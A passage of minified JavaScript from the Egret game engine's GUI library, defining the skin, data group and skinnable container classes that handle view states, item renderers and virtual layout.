this.removeElementAt(this.getElementIndex(t))},n.prototype.removeElementAt=function(t){this.checkForRangeError(t);var e=this._elementsContent[t];return this._hostComponent?this._elementRemoved(e,t):e.ownerChanged(null),this._elementsContent.splice(t,1),e},n.prototype.getElementIndex=function(t){return this._elementsContent.indexOf(t)},n.prototype.setElementIndex=function(t,e){this.checkForRangeError(e);var i=this.getElementIndex(t);-1!=i&&i!=e&&(this._hostComponent&&this._elementRemoved(t,i,!1),this._elementsContent.splice(i,1),this._elementsContent.splice(e,0,t),this._hostComponent&&this._elementAdded(t,e,!1))},n.prototype._elementAdded=function(i,n,r){void 0===r&&(r=!0),i.ownerChanged(this),i instanceof t.DisplayObject&&this._hostComponent._addToDisplayListAt(i,n,r),r&&this.hasEventListener(e.ElementExistenceEvent.ELEMENT_ADD)&&e.ElementExistenceEvent.dispatchElementExistenceEvent(this,e.ElementExistenceEvent.ELEMENT_ADD,i,n),this._hostComponent.invalidateSize(),this._hostComponent.invalidateDisplayList()},n.prototype._elementRemoved=function(i,n,r){void 0===r&&(r=!0),r&&this.hasEventListener(e.ElementExistenceEvent.ELEMENT_REMOVE)&&e.ElementExistenceEvent.dispatchElementExistenceEvent(this,e.ElementExistenceEvent.ELEMENT_REMOVE,i,n),i instanceof t.DisplayObject&&i.parent==this._hostComponent&&this._hostComponent._removeFromDisplayList(i,r),i.ownerChanged(null),this._hostComponent.invalidateSize(),this._hostComponent.invalidateDisplayList()},Object.defineProperty(n.prototype,"states",{get:function(){return this._states},set:function(t){this._setStates(t)},enumerable:!0,configurable:!0}),n.prototype._setStates=function(t){if(t||(t=[]),"string"==typeof t[0])for(var i=t.length,n=0;n<i;n++){var r=new e.State(t[n],[]);t[n]=r}this._states=t,this.currentStateChanged=!0,this.requestedCurrentState=this._currentState,this.hasState(this.requestedCurrentState)||(this.requestedCurrentState=this.getDefaultState())},Object.defineProperty(n.prototype,"currentState",{get:function(){return this.currentStateChanged?this.requestedCurrentState:this._currentState?this._currentState:this.getDefaultState()},set:function(t){t||(t=this.getDefaultState()),t!=this.currentState&&t&&this.currentState&&(this.requestedCurrentState=t,this.currentStateChanged=!0,this._hostComponent&&this.commitCurrentState())},enumerable:!0,configurable:!0}),n.prototype.hasState=function(t){return null!=this.getState(t)},n.prototype.getDefaultState=function(){return 0<this._states.length?this._states[0].name:null},n.prototype.commitCurrentState=function(){if(this.currentStateChanged){this.currentStateChanged=!1,this.getState(this.requestedCurrentState)||(this.requestedCurrentState=this.getDefaultState());var t=this._currentState?this._currentState:"";this.hasEventListener(e.StateChangeEvent.CURRENT_STATE_CHANGING)&&e.StateChangeEvent.dispatchStateChangeEvent(this,e.StateChangeEvent.CURRENT_STATE_CHANGING,t,this.requestedCurrentState?this.requestedCurrentState:""),this.removeState(this._currentState),(this._currentState=this.requestedCurrentState)&&this.applyState(this._currentState),this.hasEventListener(e.StateChangeEvent.CURRENT_STATE_CHANGE)&&e.StateChangeEvent.dispatchStateChangeEvent(this,e.StateChangeEvent.CURRENT_STATE_CHANGE,t,this._currentState?this._currentState:"")}},n.prototype.getState=function(t){if(!t)return null;for(var e=this._states,i=e.length,n=0;n<i;n++){var r=e[n];if(r.name==t)return r}return null},n.prototype.removeState=function(t){if(t=this.getState(t))for(var e=(t=t.overrides).length-1;0<=e;e--)t[e].remove(this)},n.prototype.applyState=function(t){if(t=this.getState(t))for(var e=(t=t.overrides).length,i=0;i<e;i++)t[i].apply(this)},n.prototype.initializeStates=function(){if(!this.initialized){this.initialized=!0;for(var t=this._states,e=t.length,i=0;i<e;i++)t[i].initialize(this)}},n}(t.EventDispatcher);e.Skin=i,i.prototype.__class__="egret.gui.Skin"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.useVirtualLayoutChanged=!1,this.rendererToClassMap=[],this.freeRenderers=[],this.dataProviderChanged=this.createNewRendererFlag=!1,this.recyclerDic=[],this.typicalItemChanged=this.virtualLayoutUnderway=this.itemRendererSkinNameChange=!1,this.indexToRenderer=[],this.renderersBeingUpdated=this.cleanFreeRenderer=!1}return __extends(n,i),Object.defineProperty(n.prototype,"layout",{get:function(){return this._layout},set:function(t){t!=this.layout&&(this.layout&&(this.layout.typicalLayoutRect=null,this.layout.removeEventListener("useVirtualLayoutChanged",this.layout_useVirtualLayoutChangedHandler,this)),this.layout&&t&&this.layout.useVirtualLayout!=t.useVirtualLayout&&this.changeUseVirtualLayout(),this._setLayout(t),t&&(t.typicalLayoutRect=this.typicalLayoutRect,t.addEventListener("useVirtualLayoutChanged",this.layout_useVirtualLayoutChangedHandler,this)))},enumerable:!0,configurable:!0}),n.prototype.layout_useVirtualLayoutChangedHandler=function(t){this.changeUseVirtualLayout()},n.prototype.setVirtualElementIndicesInView=function(t,e){if(this.layout&&this.layout.useVirtualLayout){this.virtualRendererIndices=[];for(var i=t;i<=e;i++)this.virtualRendererIndices.push(i);for(var n in this.indexToRenderer)n=parseInt(n),-1==this.virtualRendererIndices.indexOf(n)&&this.freeRendererByIndex(n)}},n.prototype.getVirtualElementAt=function(t){if(0>t||t>=this.dataProvider.length)return null;if(!(i=this.indexToRenderer[t])){var i=this.dataProvider.getItemAt(t),n=this.createVirtualRenderer(t);this.indexToRenderer[t]=n,this.updateRenderer(n,t,i),this.createNewRendererFlag&&("validateNow"in n&&n.validateNow(),this.createNewRendererFlag=!1,e.RendererExistenceEvent.dispatchRendererExistenceEvent(this,e.RendererExistenceEvent.RENDERER_ADD,n,t,i)),i=n}return i},n.prototype.freeRendererByIndex=function(e){if(this.indexToRenderer[e]){var i=this.indexToRenderer[e];delete this.indexToRenderer[e],i&&i instanceof t.DisplayObject&&this.doFreeRenderer(i)}},n.prototype.doFreeRenderer=function(t){var e=this.rendererToClassMap[t.hashCode].hashCode;this.freeRenderers[e]||(this.freeRenderers[e]=[]),this.freeRenderers[e].push(t),t.visible=!1},n.prototype.invalidateSize=function(){this.createNewRendererFlag||i.prototype.invalidateSize.call(this)},n.prototype.createVirtualRenderer=function(t){t=this.dataProvider.getItemAt(t);var e=(t=this.itemToRendererClass(t)).hashCode,i=this.freeRenderers;return i[e]&&0<i[e].length?(t=i[e].pop(),t.visible=!0,t):(this.createNewRendererFlag=!0,this.createOneRenderer(t))},n.prototype.createOneRenderer=function(e){var i,n=e.hashCode,r=this.recyclerDic[n];return r&&(i=r.pop(),0==r.length&&delete this.recyclerDic[n]),i||(i=e.newInstance(),this.rendererToClassMap[i.hashCode]=e),i&&i instanceof t.DisplayObject?(this._itemRendererSkinName&&this.setItemRenderSkinName(i),this._addToDisplayList(i),i.setLayoutBoundsSize(NaN,NaN),i):null},n.prototype.setItemRenderSkinName=function(t){t&&(t?t._skinNameExplicitlySet||(t.skinName=this._itemRendererSkinName):t&&!t.skinName&&(t.skinName=this._itemRendererSkinName))},n.prototype.finishVirtualLayout=function(){if(this.virtualLayoutUnderway){var e,i=this.virtualLayoutUnderway=!1;for(e in this.freeRenderers)if(0<this.freeRenderers[e].length){i=!0;break}i&&(this.cleanTimer||(this.cleanTimer=new t.Timer(3e3,1),this.cleanTimer.addEventListener(t.TimerEvent.TIMER,this.cleanAllFreeRenderer,this)),this.cleanTimer.reset(),this.cleanTimer.start())}},n.prototype.cleanAllFreeRenderer=function(t){var e,i=this.freeRenderers;for(e in i)for(var n=i[e],r=n.length,s=0;s<r;s++)t=n[s],t.visible=!0,this.recycle(t);this.freeRenderers=[],this.cleanFreeRenderer=!1},n.prototype.getElementIndicesInView=function(){return this.layout&&this.layout.useVirtualLayout?this.virtualRendererIndices?this.virtualRendererIndices:[]:i.prototype.getElementIndicesInView.call(this)},n.prototype.changeUseVirtualLayout=function(){this.cleanFreeRenderer=this.useVirtualLayoutChanged=!0,this.removeDataProviderListener(),this.invalidateProperties()},Object.defineProperty(n.prototype,"dataProvider",{get:function(){return this._dataProvider},set:function(t){this._dataProvider!=t&&(this.removeDataProviderListener(),this._dataProvider=t,this.cleanFreeRenderer=this.dataProviderChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),n.prototype.removeDataProviderListener=function(){this._dataProvider&&this._dataProvider.removeEventListener(e.CollectionEvent.COLLECTION_CHANGE,this.onCollectionChange,this)},n.prototype.onCollectionChange=function(t){switch(t.kind){case e.CollectionEventKind.ADD:this.itemAddedHandler(t.items,t.location);break;case e.CollectionEventKind.MOVE:this.itemMovedHandler(t.items[0],t.location,t.oldLocation);break;case e.CollectionEventKind.REMOVE:this.itemRemovedHandler(t.items,t.location);break;case e.CollectionEventKind.UPDATE:this.itemUpdatedHandler(t.items[0],t.location);break;case e.CollectionEventKind.REPLACE:this.itemRemoved(t.oldItems[0],t.location),this.itemAdded(t.items[0],t.location);break;case e.CollectionEventKind.RESET:case e.CollectionEventKind.REFRESH:if(this.layout&&this.layout.useVirtualLayout)for(var i in this.indexToRenderer)i=parseInt(i),this.freeRendererByIndex(i);this.dataProviderChanged=!0,this.invalidateProperties()}this.invalidateSize(),this.invalidateDisplayList()},n.prototype.itemAddedHandler=function(t,e){for(var i=t.length,n=0;n<i;n++)this.itemAdded(t[n],e+n);this.resetRenderersIndices()},n.prototype.itemMovedHandler=function(t,e,i){this.itemRemoved(t,i),this.itemAdded(t,e),this.resetRenderersIndices()},n.prototype.itemRemovedHandler=function(t,e){for(var i=t.length-1;0<=i;i--)this.itemRemoved(t[i],e+i);this.resetRenderersIndices()},n.prototype.itemAdded=function(t,i){if(this.layout&&this.layout.elementAdded(i),this.layout&&this.layout.useVirtualLayout){var n=this.virtualRendererIndices;if(n){for(var r=n.length,s=0;s<r;s++){var o=n[s];o>=i&&(n[s]=o+1)}this.indexToRenderer.splice(i,0,null)}}else n=this.itemToRendererClass(t),n=this.createOneRenderer(n),this.indexToRenderer.splice(i,0,n),n&&(this.updateRenderer(n,i,t),e.RendererExistenceEvent.dispatchRendererExistenceEvent(this,e.RendererExistenceEvent.RENDERER_ADD,n,i,t))},n.prototype.itemRemoved=function(i,n){this.layout&&this.layout.elementRemoved(n);var r=this.virtualRendererIndices;if(r&&0<r.length){for(var s=-1,o=r.length,a=0;a<o;a++){var h=r[a];h==n?s=a:h>n&&(r[a]=h-1)}-1!=s&&r.splice(s,1)}r=this.indexToRenderer[n],this.indexToRenderer.length>n&&this.indexToRenderer.splice(n,1),e.RendererExistenceEvent.dispatchRendererExistenceEvent(this,e.RendererExistenceEvent.RENDERER_REMOVE,r,n,i),r&&r instanceof t.DisplayObject&&this.recycle(r)},n.prototype.recycle=function(e){this._removeFromDisplayList(e),"ownerChanged"in e&&e.ownerChanged(null);var i=this.rendererToClassMap[e.hashCode].hashCode;this.recyclerDic[i]||(this.recyclerDic[i]=new t.Recycler),this.recyclerDic[i].push(e)},n.prototype.resetRenderersIndices=function(){if(0!=this.indexToRenderer.length)if(this.layout&&this.layout.useVirtualLayout)for(var t=this.virtualRendererIndices,e=t.length,i=0;i<e;i++){var n=t[i];this.resetRendererItemIndex(n)}else for(t=this.indexToRenderer.length,n=0;n<t;n++)this.resetRendererItemIndex(n)},n.prototype.itemUpdatedHandler=function(t,e){if(!this.renderersBeingUpdated){var i=this.indexToRenderer[e];i&&this.updateRenderer(i,e,t)}},n.prototype.resetRendererItemIndex=function(t){var e=this.indexToRenderer[t];e&&(e.itemIndex=t)},Object.defineProperty(n.prototype,"itemRenderer",{get:function(){return this._itemRenderer},set:function(t){this._itemRenderer!==t&&(this._itemRenderer=t,this.cleanFreeRenderer=this.typicalItemChanged=this.itemRendererChanged=!0,this.removeDataProviderListener(),this.invalidateProperties())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"itemRendererSkinName",{get:function(){return this._itemRendererSkinName},set:function(t){this._itemRendererSkinName!=t&&(this._itemRendererSkinName=t)&&this.initialized&&(this.itemRendererSkinNameChange=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"itemRendererFunction",{get:function(){return this._itemRendererFunction},set:function(t){this._itemRendererFunction!=t&&(this._itemRendererFunction=t,this.typicalItemChanged=this.itemRendererChanged=!0,this.removeDataProviderListener(),this.invalidateProperties())},enumerable:!0,configurable:!0}),n.prototype.itemToRendererClass=function(t){return null!=this._itemRendererFunction?(t=this._itemRendererFunction(t))||(t=this._itemRenderer):t=this._itemRenderer,t||n.defaultRendererFactory},n.prototype.createChildren=function(){if(!this.layout){var n=new e.VerticalLayout;n.gap=0,n.horizontalAlign=t.HorizontalAlign.CONTENT_JUSTIFY,this.layout=n}i.prototype.createChildren.call(this)},n.prototype.commitProperties=function(){if((this.itemRendererChanged||this.dataProviderChanged||this.useVirtualLayoutChanged)&&(this.removeAllRenderers(),this.layout&&this.layout.clearVirtualLayoutCache(),this.setTypicalLayoutRect(null),this.itemRendererChanged=this.useVirtualLayoutChanged=!1,this._dataProvider&&this._dataProvider.addEventListener(e.CollectionEvent.COLLECTION_CHANGE,this.onCollectionChange,this),this.layout&&this.layout.useVirtualLayout?(this.invalidateSize(),this.invalidateDisplayList()):this.createRenderers(),this.dataProviderChanged&&(this.dataProviderChanged=!1,this.verticalScrollPosition=this.horizontalScrollPosition=0)),i.prototype.commitProperties.call(this),this.typicalItemChanged&&(this.typicalItemChanged=!1,this._dataProvider&&0<this._dataProvider.length&&(this.typicalItem=this._dataProvider.getItemAt(0),this.measureRendererSize())),this.itemRendererSkinNameChange){this.itemRendererSkinNameChange=!1;for(var t=this.indexToRenderer.length,n=0;n<t;n++)this.setItemRenderSkinName(this.indexToRenderer[n]);var r,s=this.freeRenderers;for(r in s){var o=s[r];if(o)for(t=o.length,n=0;n<t;n++)this.setItemRenderSkinName(o[n])}}},n.prototype.measure=function(){this.layout&&this.layout.useVirtualLayout&&this.ensureTypicalLayoutElement(),i.prototype.measure.call(this)},n.prototype.updateDisplayList=function(t,e){this._layoutInvalidateDisplayListFlag&&this.layout&&this.layout.useVirtualLayout&&(this.virtualLayoutUnderway=!0,this.ensureTypicalLayoutElement()),i.prototype.updateDisplayList.call(this,t,e),this.virtualLayoutUnderway&&this.finishVirtualLayout()},n.prototype.ensureTypicalLayoutElement=function(){!this.layout.typicalLayoutRect&&this._dataProvider&&0<this._dataProvider.length&&(this.typicalItem=this._dataProvider.getItemAt(0),this.measureRendererSize())},n.prototype.measureRendererSize=function(){if(this.typicalItem){var e=this.itemToRendererClass(this.typicalItem);if(e=this.createOneRenderer(e)){this.createNewRendererFlag=!0,this.updateRenderer(e,0,this.typicalItem),"validateNow"in e&&e.validateNow();var i=new t.Rectangle(0,0,e.preferredWidth,e.preferredHeight);this.recycle(e),this.setTypicalLayoutRect(i),this.createNewRendererFlag=!1}else this.setTypicalLayoutRect(null)}else this.setTypicalLayoutRect(null)},n.prototype.setTypicalLayoutRect=function(t){this.typicalLayoutRect=t,this.layout&&(this.layout.typicalLayoutRect=t)},n.prototype.removeAllRenderers=function(){for(var t,i=this.indexToRenderer.length,n=0;n<i;n++)(t=this.indexToRenderer[n])&&(this.recycle(t),e.RendererExistenceEvent.dispatchRendererExistenceEvent(this,e.RendererExistenceEvent.RENDERER_REMOVE,t,t.itemIndex,t.data));this.indexToRenderer=[],this.virtualRendererIndices=null,this.cleanFreeRenderer&&this.cleanAllFreeRenderer()},n.prototype.createRenderers=function(){if(this._dataProvider)for(var t=0,i=this._dataProvider.length,n=0;n<i;n++){var r=this._dataProvider.getItemAt(n),s=this.itemToRendererClass(r);(s=this.createOneRenderer(s))&&(this.indexToRenderer[t]=s,this.updateRenderer(s,t,r),e.RendererExistenceEvent.dispatchRendererExistenceEvent(this,e.RendererExistenceEvent.RENDERER_ADD,s,t,r),t++)}},n.prototype.updateRenderer=function(t,e,i){return this.renderersBeingUpdated=!0,this._rendererOwner?t=this._rendererOwner.updateRenderer(t,e,i):("ownerChanged"in t&&t.ownerChanged(this),t.itemIndex=e,t.label=this.itemToLabel(i),t.data=i),this.renderersBeingUpdated=!1,t},n.prototype.itemToLabel=function(t){return t?t.toString():" "},n.prototype.getElementAt=function(t){return this.indexToRenderer[t]},n.prototype.getElementIndex=function(t){return t?this.indexToRenderer.indexOf(t):-1},Object.defineProperty(n.prototype,"numElements",{get:function(){return this._dataProvider?this._dataProvider.length:0},enumerable:!0,configurable:!0}),n.prototype.addChild=function(t){throw Error("addChild()"+n.errorStr+"addElement()代替")},n.prototype.addChildAt=function(t,e){throw Error("addChildAt()"+n.errorStr+"addElementAt()代替")},n.prototype.removeChild=function(t){throw Error("removeChild()"+n.errorStr+"removeElement()代替")},n.prototype.removeChildAt=function(t){throw Error("removeChildAt()"+n.errorStr+"removeElementAt()代替")},n.prototype.setChildIndex=function(t,e){throw Error("setChildIndex()"+n.errorStr+"setElementIndex()代替")},n.prototype.swapChildren=function(t,e){throw Error("swapChildren()"+n.errorStr+"swapElements()代替")},n.prototype.swapChildrenAt=function(t,e){throw Error("swapChildrenAt()"+n.errorStr+"swapElementsAt()代替")},n.defaultRendererFactory=new e.ClassFactory(e.ItemRenderer),n.errorStr="在此组件中不可用，若此组件为容器类，请使用",n}(e.GroupBase);e.DataGroup=i,i.prototype.__class__="egret.gui.DataGroup"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(e){function i(){e.call(this),this.contentGroupProperties={},this.hostComponentKey="egret.gui.SkinnableContainer"}return __extends(i,e),i.prototype._getCurrentContentGroup=function(){return null==this.contentGroup?(null==this._placeHolderGroup&&(this._placeHolderGroup=new t.Group,this._placeHolderGroup.visible=!1,this._addToDisplayList(this._placeHolderGroup)),this._placeHolderGroup.addEventListener(t.ElementExistenceEvent.ELEMENT_ADD,this._contentGroup_elementAddedHandler,this),this._placeHolderGroup.addEventListener(t.ElementExistenceEvent.ELEMENT_REMOVE,this._contentGroup_elementRemovedHandler,this),this._placeHolderGroup):this.contentGroup},Object.defineProperty(i.prototype,"elementsContent",{set:function(t){this._getCurrentContentGroup().elementsContent=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"numElements",{get:function(){return this._getCurrentContentGroup().numElements},enumerable:!0,configurable:!0}),i.prototype.getElementAt=function(t){return this._getCurrentContentGroup().getElementAt(t)},i.prototype.addElement=function(t){return this._getCurrentContentGroup().addElement(t)},i.prototype.addElementAt=function(t,e){return this._getCurrentContentGroup().addElementAt(t,e)},i.prototype.removeElement=function(t){return this._getCurrentContentGroup().removeElement(t)},i.prototype.removeElementAt=function(t){return this._getCurrentContentGroup().removeElementAt(t)},i.prototype.removeAllElements=function(){this._getCurrentContentGroup().removeAllElements()},i.prototype.getElementIndex=function(t){return this._getCurrentContentGroup().getElementIndex(t)},i.prototype.setElementIndex=function(t,e){this._getCurrentContentGroup().setElementIndex(t,e)},i.prototype.swapElements=function(t,e){this._getCurrentContentGroup().swapElements(t,e)},i.prototype.swapElementsAt=function(t,e){this._getCurrentContentGroup().swapElementsAt(t,e)},Object.defineProperty(i.prototype,"layout",{get:function(){return null!=this.contentGroup?this.contentGroup.layout:this.contentGroupProperties.layout},set:function(t){null!=this.contentGroup?this.contentGroup.layout=t:this.contentGroupProperties.layout=t},enumerable:!0,configurable:!0}),i.prototype.partAdded=function(i,n){if(e.prototype.partAdded.call(this,i,n),n==this.contentGroup){if(void 0!==this.contentGroupProperties.layout&&(this.contentGroup.layout=this.contentGroupProperties.layout,this.contentGroupProperties={}),this._placeHolderGroup){this._placeHolderGroup.removeEventListener(t.ElementExistenceEvent.ELEMENT_ADD,this._contentGroup_elementAddedHandler,this),this._placeHolderGroup.removeEventListener(t.ElementExistenceEvent.ELEMENT_REMOVE,this._contentGroup_elementRemovedHandler,this);for(var r=this._placeHolderGroup._getElementsContent().concat(),s=this._placeHolderGroup.numElements;0<s;s--){var o=this._placeHolderGroup.removeElementAt(0);o.ownerChanged(null)}for(this._removeFromDisplayList(this._placeHolderGroup),this.contentGroup.elementsContent=r,s=r.length-1;0<=s;s--)(o=r[s]).ownerChanged(this);this._placeHolderGroup=null}this.contentGroup.addEventListener(t.ElementExistenceEvent.ELEMENT_ADD,this._contentGroup_elementAddedHandler,this),this.contentGroup.addEventListener(t.ElementExistenceEvent.ELEMENT_REMOVE,this._contentGroup_elementRemovedHandler,this)}},i.prototype.partRemoved=function(i,n){if(e.prototype.partRemoved.call(this,i,n),n==this.contentGroup&&(this.contentGroup.removeEventListener(t.ElementExistenceEvent.ELEMENT_ADD,this._contentGroup_elementAddedHandler,this),this.contentGroup.removeEventListener(t.ElementExistenceEvent.ELEMENT_REMOVE,this._contentGroup_elementRemovedHandler,this),this.contentGroupProperties.layout=this.contentGroup.layout,this.contentGroup.layout=null,0<this.contentGroup.numElements)){for(this._placeHolderGroup=new t.Group;0<this.contentGroup.numElements;)this._placeHolderGroup.addElement(this.contentGroup.getElementAt(0));this._placeHolderGroup.addEventListener(t.ElementExistenceEvent.ELEMENT_ADD,this._contentGroup_elementAddedHandler,this),this._placeHolderGroup.addEventListener(t.ElementExistenceEvent.ELEMENT_REMOVE,this._contentGroup_elementRemovedHandler,this)}},i.prototype._contentGroup_elementAddedHandler=function(t){t.element.ownerChanged(this),this.dispatchEvent(t)},i.prototype._contentGroup_elementRemovedHandler=function(t){t.element.ownerChanged(null),this.dispatchEvent(t)},i}(t.SkinnableComponent);t.SkinnableContainer=e,e.prototype.__class__="egret.gui.SkinnableContainer"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(e){function i(){e.call(this),this._dataGroupProperties={},this.hostComponentKey="egret.gui.SkinnableDataContainer"}return __extends(i,e),i.prototype.updateRenderer=function(t,e,i){return"ownerChanged"in t&&t.ownerChanged(this),t.itemIndex=e,t.label=this.itemToLabel(i),t.data=i,t},i.prototype.itemToLabel=function(t){return null!==t?t.toString():" "},Object.defineProperty(i.prototype,"dataProvider",{get:function(){return this._getDataProvider()},set:function(t){this._setDataProvider(t)},enumerable:!0,configurable:!0}),i.prototype._getDataProvider=function(){return null!=this.dataGroup?this.dataGroup.dataProvider:this._dataGroupProperties.dataProvider},i.prototype._setDataProvider=function(t){null==this.dataGroup?this._dataGroupProperties.dataProvider=t:(this.dataGroup.dataProvider=t,this._dataGroupProperties.dataProvider=!0)},Object.defineProperty(i.prototype,"itemRenderer",{get:function(){return this.dataGroup?this.dataGroup.itemRenderer:this._dataGroupProperties.itemRenderer},set:function(t){null==this.dataGroup?this._dataGroupProperties.itemRenderer=t:(this.dataGroup.itemRenderer=t,this._dataGroupProperties.itemRenderer=!0)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"itemRendererSkinName",{get:function(){return this.dataGroup?this.dataGroup.itemRendererSkinName:this._dataGroupProperties.itemRendererSkinName},set:function(t){null==this.dataGroup?this._dataGroupProperties.itemRendererSkinName=t:(this.dataGroup.itemRendererSkinName=t,this._dataGroupProperties.itemRendererSkinName=!0)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"itemRendererFunction",{get:function(){return this.dataGroup?this.dataGroup.itemRendererFunction:this._dataGroupProperties.itemRendererFunction},set:function(t){null==this.dataGroup?this._dataGroupProperties.itemRendererFunction=t:(this.dataGroup.itemRendererFunction=t,this._dataGroupProperties.itemRendererFunction=!0)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"layout",{get:function(){return this.dataGroup?this.dataGroup.layout:this._dataGroupProperties.layout},set:function(t){this._setLayout(t)},enumerable:!0,configurable:!0}),i.prototype._setLayout=function(t){null==this.dataGroup?this._dataGroupProperties.layout=t:(this.dataGroup.layout=t,this._dataGroupProperties.layout=!0)},i.prototype.partAdded=function(i,n){if(e.prototype.partAdded.call(this,i,n),n==this.dataGroup){var r={};void 0!==this._dataGroupProperties.layout&&(this.dataGroup.layout=this._dataGroupProperties.layout,r.layout=!0),void 0!==this._dataGroupProperties.dataProvider&&(this.dataGroup.dataProvider=this._dataGroupProperties.dataProvider,r.dataProvider=!0),void 0!==this._dataGroupProperties.itemRenderer&&(this.dataGroup.itemRenderer=this._dataGroupProperties.itemRenderer,r.itemRenderer=!0),void 0!==this._dataGroupProperties.itemRendererSkinName&&(this.dataGroup.itemRendererSkinName=this._dataGroupProperties.itemRendererSkinName,r.itemRendererSkinName=!0),void 0!==this._dataGroupProperties.itemRendererFunction&&(this.dataGroup.itemRendererFunction=this._dataGroupProperties.itemRendererFunction,r.itemRendererFunction=!0),this.dataGroup._rendererOwner=this,this._dataGroupProperties=r,this.hasEventListener(t.RendererExistenceEvent.RENDERER_ADD)&&this.dataGroup.addEventListener(t.RendererExistenceEvent.RENDERER_ADD,this.dispatchEvent,this),this.hasEventListener(t.RendererExistenceEvent.RENDERER_REMOVE)&&this.dataGroup.addEventListener(t.RendererExistenceEvent.RENDERER_REMOVE,this.dispatchEvent,this)}},i.prototype.partRemoved=function(i,n){if(e.prototype.partRemoved.call(this,i,n),n==this.dataGroup){this.dataGroup.removeEventListener(t.RendererExistenceEvent.RENDERER_ADD,this.dispatchEvent,this),this.dataGroup.removeEventListener(t.RendererExistenceEvent.RENDERER_REMOVE,this.dispatchEvent,this);var r={};this._dataGroupProperties.layout&&(r.layout=this.dataGroup.layout),this._dataGroupProperties.dataProvider&&(r.dataProvider=this.dataGroup.dataProvider),this._dataGroupProperties.itemRenderer&&(r.itemRenderer=this.dataGroup.itemRenderer),this._dataGroupProperties.itemRendererSkinName&&(r.itemRendererSkinName=this.dataGroup.itemRendererSkinName),this._dataGroupProperties.itemRendererFunction&&(r.itemRendererFunction=this.dataGroup.itemRendererFunction),this._dataGroupProperties=r,this.dataGroup._rendererOwner=null,this.dataGroup.dataProvider=null,this.dataGroup.layout=null}},i.prototype.addEventListener=function(i,n,r,s,o){void 0===s&&(s=!1),void 0===o&&(o=0),e.prototype.addEventListener.call(this,i,n,r,s,o),i==t.RendererExistenceEvent.RENDERER_ADD&&this.dataGroup&&this.dataGroup.addEventListener(t.RendererExistenceEvent.RENDERER_ADD,this.dispatchEvent,this),i==t.RendererExistenceEvent.RENDERER_REMOVE&&this.dataGroup&&this.dataGroup.addEventListener(t.RendererExistenceEvent.RENDERER_REMOVE,this.dispatchEvent,this)},i.prototype.removeEventListener=function(i,n,r,s){void 0===s&&(s=!1),e.prototype.removeEventListener.call(this,i,n,r,s),i==t.RendererExistenceEvent.RENDERER_ADD&&this.dataGroup&&(this.hasEventListener(t.RendererExistenceEvent.RENDERER_ADD)||this.dataGroup.removeEventListener(t.RendererExistenceEvent.RENDERER_ADD,this.dispatchEvent,this)),i==t.RendererExistenceEvent.RENDERER_REMOVE&&this.dataGroup&&(this.hasEventListener(t.RendererExistenceEvent.RENDERER_REMOVE)||this.dataGroup.removeEventListener(t.RendererExistenceEvent.RENDERER_REMOVE,this.dispatchEvent,this))},i}(t.SkinnableComponent);t.SkinnableDataContainer=e,e.prototype.__class__="egret.gui.SkinnableDataContainer"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._doingWholesaleChanges=!1,this._labelField="label",this.requireSelectionChanged=this._requireSelection=!1,this._proposedSelectedIndex=n.NO_PROPOSED_SELECTION,this._selectedIndex=n.NO_SELECTION,this.selectedIndexAdjusted=this._useVirtualLayout=this._dispatchChangeAfterSelection=this._allowCustomSelectedItem=!1}return __extends(n,i),n.prototype._setDataProvider=function(t){this.dataProvider&&this.dataProvider.removeEventListener(e.CollectionEvent.COLLECTION_CHANGE,this.dataProvider_collectionChangeHandler,this),this._doingWholesaleChanges=this.dataProviderChanged=!0,t&&t.addEventListener(e.CollectionEvent.COLLECTION_CHANGE,this.dataProvider_collectionChangeHandler,this),i.prototype._setDataProvider.call(this,t),this.invalidateProperties()},Object.defineProperty(n.prototype,"layout",{get:function(){return this.dataGroup?this.dataGroup.layout:this._dataGroupProperties.layout},set:function(t){t&&this.useVirtualLayout&&(t.useVirtualLayout=!0),this._setLayout(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"labelField",{get:function(){return this._labelField},set:function(t){this._setLabelField(t)},enumerable:!0,configurable:!0}),n.prototype._setLabelField=function(t){t!=this._labelField&&(this._labelField=t,this.labelFieldOrFunctionChanged=!0,this.invalidateProperties())},Object.defineProperty(n.prototype,"labelFunction",{get:function(){return this._labelFunction},set:function(t){this._setLabelFunction(t)},enumerable:!0,configurable:!0}),n.prototype._setLabelFunction=function(t){t!=this._labelFunction&&(this._labelFunction=t,this.labelFieldOrFunctionChanged=!0,this.invalidateProperties())},Object.defineProperty(n.prototype,"requireSelection",{get:function(){return this._requireSelection},set:function(t){this._setRequireSelection(t)},enumerable:!0,configurable:!0}),n.prototype._setRequireSelection=function(t){t!=this._requireSelection&&(this._requireSelection=t)&&(this.requireSelectionChanged=!0,this.invalidateProperties())},Object.defineProperty(n.prototype,"selectedIndex",{get:function(){return this._getSelectedIndex()},set:function(t){this._setSelectedIndex(t,!1)},enumerable:!0,configurable:!0}),n.prototype._getSelectedIndex=function(){return this._proposedSelectedIndex!=n.NO_PROPOSED_SELECTION?this._proposedSelectedIndex:this._selectedIndex},n.prototype._setSelectedIndex=function(t,e){void 